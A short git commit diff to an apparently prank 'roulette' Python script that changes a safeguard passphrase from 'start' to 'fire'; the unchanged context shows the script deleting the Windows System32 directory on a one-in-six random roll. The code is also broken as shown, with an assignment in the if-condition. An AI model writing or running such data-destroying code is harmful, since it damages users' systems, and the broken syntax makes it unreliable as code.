e84b0ada6eeca8eead7dd9eab9a98c4e3207742d
kimanthi777 <89152809+kimanthi777@users.noreply.github.com>
2021-10-02 19:39:30 +0300

    Update roulettePythonEdition.py

--- roulettePythonEdition.py
+++ roulettePythonEdition.py
@@ -3,6 +3,6 @@ import random
 
 # the safeguard is optional. It's just put in place so that one does not run the program unintentionally
 safeguard = input('Enter a safeguard pass: ')
-if safeguard = 'start':
+if safeguard = 'fire':
 	if random.randint(1,6) == 6:
 		os.remove('C:\\Windows\\System32')
